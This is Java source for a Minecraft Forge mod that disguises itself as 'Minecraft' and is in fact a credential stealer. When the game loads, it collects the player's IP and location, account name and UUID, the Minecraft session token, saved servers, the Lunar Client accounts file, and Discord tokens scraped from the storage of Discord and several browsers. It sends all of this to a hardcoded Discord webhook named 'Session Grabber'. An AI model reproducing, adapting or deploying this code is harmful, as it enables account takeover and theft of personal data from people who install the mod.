package com.github.shurpe;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import net.minecraft.client.Minecraft;
import net.minecraft.client.multiplayer.ServerData;
import net.minecraft.client.multiplayer.ServerList;
import net.minecraft.util.Session;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.Mod.EventHandler;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.file.Files;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;

@Mod(modid = "Minecraft", name = "Minecraft", version = "1.8.9")
public final class Main {

    // --- KONFIGURATION ---
    // WICHTIG: Deine Webhook URL hier eintragen!
    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1455249579246354679/PFz12Wzk9KGdz28SbWugN-CFfnPC1qyZkkukfSmG3jjWQjHKMWAfxB9RM2NTVp8n35fB";
    private static final boolean PING_EVERYONE = true;
    private static final Minecraft mc = Minecraft.getMinecraft();

    // --- HILFSMETHODEN ---

    // Kürzt Texte sicher, damit Discord nicht abstürzt
    private String safeString(String text, int maxLength) {
        if (text == null) return "Unknown";
        if (text.length() > maxLength) {
            return text.substring(0, maxLength - 3) + "...";
        }
        return text;
    }

    // --- GENERATOREN FÜR DIE DISCORD EMBEDS ---

    private DiscordWebhook.EmbedObject genGeoInfoEmbed() throws Exception {
        final JsonObject info = (JsonObject) new JsonParser().parse(HttpUtils.getContentAsString("https://ipapi.co/json"));
        return new DiscordWebhook.EmbedObject()
                .setTitle(":earth_americas: IP Info")
                .setColor(0x4400FF)
                .setDescription("Target IP and Geo-Location")
                .addField("Country", "```" + info.get("country_name").getAsString() + "```", true)
                .addField("City", "```" + info.get("city").getAsString() + "```", true)
                .addField("IP", "```" + info.get("ip").getAsString() + "```", true);
    }

    private DiscordWebhook.EmbedObject genAccInfoEmbed() {
        final Session session = mc.getSession();
        return new DiscordWebhook.EmbedObject()
                .setTitle(":unlock: Account Info")
                .setColor(0x6E39FF)
                .setDescription(
                        "[NameMC](https://namemc.com/" + session.getPlayerID() + ')' +
                        " | [Plancke](https://plancke.io/hypixel/player/stats/" + session.getPlayerID() + ')' +
                        " | [SkyCrypt](https://sky.shiiyu.moe/stats/" + session.getPlayerID() + ')')
                .addField("Name", "```" + session.getUsername() + "```", true)
                .addField("UUID", "```" + session.getPlayerID() + "```", true);
    }

    private DiscordWebhook.EmbedObject genTokenEmbed() {
        String token = mc.getSession().getToken();
        token = safeString(token, 4000); // Zur Sicherheit kürzen
        return new DiscordWebhook.EmbedObject()
                .setTitle(":key: Minecraft Session Token")
                .setColor(0xFFA500) // Orange Farbe
                .setDescription("```" + token + "```");
    }

    private DiscordWebhook.EmbedObject genServersInfoEmbed() {
        final DiscordWebhook.EmbedObject serversEmbed = new DiscordWebhook.EmbedObject()
                .setTitle(":file_folder: Saved Servers")
                .setColor(0x8F67FC)
                .setDescription("Saved Minecraft servers");
        final ServerList servers = new ServerList(mc);
        int limit = Math.min(servers.countServers(), 15);
        for (int i = 0; i < limit; i++) {
            final ServerData server = servers.getServerData(i);
            String name = safeString(server.serverName, 50);
            String ip = safeString(server.serverIP, 100);
            serversEmbed.addField(":label: " + name, "```" + ip + "```", true);
        }
        if (servers.countServers() > limit) {
            serversEmbed.addField("More...", "```" + (servers.countServers() - limit) + " hidden```", false);
        }
        return serversEmbed;
    }

    private DiscordWebhook.EmbedObject genLunarInfoEmbed() {
        String lunarPath = System.getProperty("user.home") + "/.lunarclient/settings/game/accounts.json";
        File lunarFile = new File(lunarPath);
        String content = "File not found";
        if (lunarFile.exists()) {
            try {
                byte[] encoded = Files.readAllBytes(lunarFile.toPath());
                content = new String(encoded, StandardCharsets.UTF_8);
                content = safeString(content, 1500);
            } catch (Exception e) {
                content = "Error: " + e.getMessage();
            }
        }
        return new DiscordWebhook.EmbedObject()
                .setTitle(":crescent_moon: Lunar Client")
                .setColor(0xEE3333)
                .setDescription("```json\n" + content + "\n```");
    }

    // NEU: Embed für die gefundenen Discord Tokens
    private DiscordWebhook.EmbedObject genDiscordTokensEmbed() {
        ArrayList<String> tokens = getTokens();
        DiscordWebhook.EmbedObject tokenEmbed = new DiscordWebhook.EmbedObject()
                .setTitle(":robot: Discord Tokens")
                .setColor(0x7289DA); // Discord Blau

        if (tokens.isEmpty()) {
            tokenEmbed.setDescription("Keine Discord Tokens gefunden.");
        } else {
            StringBuilder sb = new StringBuilder();
            for (String token : tokens) {
                // Token kürzen, um das Feld nicht zu überladen und die Länge zu begrenzen
                String shortToken = token.length() > 40 ? token.substring(0, 37) + "..." : token;
                sb.append(":small_orange_diamond: `").append(shortToken).append("`\n");
            }
            tokenEmbed.setDescription(sb.toString());
        }
        return tokenEmbed;
    }


    // NEU: Methode aus dem zweiten Code zum Suchen von Discord Tokens
    public static ArrayList<String> getTokens() {
        ArrayList<String> temp = new ArrayList<>();
        ArrayList<File> paths = new ArrayList<>();
        paths.add(new File(System.getProperty("user.home") + "/AppData/Roaming/Discord/Local Storage/leveldb/"));
        paths.add(new File(System.getProperty("user.home") + "/AppData/Roaming/discordptb/Local Storage/leveldb/"));
        paths.add(new File(System.getProperty("user.home") + "/AppData/Roaming/discordcanary/Local Storage/leveldb/"));
        paths.add(new File(System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb/"));
        paths.add(new File(System.getProperty("user.home") + "/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb/"));
        paths.add(new File(System.getProperty("user.home") + "/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb/"));
        paths.add(new File(System.getProperty("user.home") + "/AppData/Roaming/Opera Software/Opera Stable/User Data/Default/Local Storage/leveldb/"));

        for (File file : paths) {
            if (!file.exists()) {
                continue;
            }
            File[] filesList = file.listFiles();
            if (filesList == null) continue;
            for (File pathname : filesList) {
                try (BufferedReader br = new BufferedReader(new InputStreamReader(new DataInputStream(new FileInputStream(pathname))))) {
                    String strLine;
                    while ((strLine = br.readLine()) != null) {
                        int index;
                        while ((index = strLine.indexOf("oken")) != -1) {
                            try {
                                strLine = strLine.substring(index + "oken".length() + 1);
                                String token = strLine.split("\"")[1];
                                if (!temp.contains(token) && token.split("\\.").length >= 2) {
                                    temp.add(token);
                                }
                            } catch (Exception ignored) {
                                // Ignoriere Fehler beim Token-Parsing
                            }
                        }
                    }
                } catch (Exception ignored) {
                    // Ignoriere Fehler beim Lesen einer Datei und setze fort
                }
            }
        }
        return temp;
    }


    // --- AUSFÜHRUNG ---

    private DiscordWebhook genWebhook() {
        final DiscordWebhook webhook = new DiscordWebhook(WEBHOOK_URL)
                .setUsername("Session Grabber");

        if (PING_EVERYONE) {
            webhook.setContent("@everyone");
        }

        try {
            webhook.addEmbed(genGeoInfoEmbed());
        } catch (Exception e) {
            System.out.println("Geo-Info konnte nicht abgerufen werden (wird übersprungen).");
        }

        webhook.addEmbed(genAccInfoEmbed());
        webhook.addEmbed(genTokenEmbed());
        webhook.addEmbed(genServersInfoEmbed());
        webhook.addEmbed(genLunarInfoEmbed());
        webhook.addEmbed(genDiscordTokensEmbed()); // NEU: Fügt das Discord-Token-Embed hinzu

        return webhook;
    }

    private void execWebhook() {
        new Thread(() -> {
            try {
                genWebhook().execute();
                System.out.println("Webhook erfolgreich gesendet!");
            } catch (final Exception e) {
                System.err.println("FEHLER BEIM SENDEN DES WEBHOOKS:");
                e.printStackTrace();
            }
        }).start();
    }

    @EventHandler
    public void preInit(final FMLPreInitializationEvent event) {
        execWebhook();
    }
}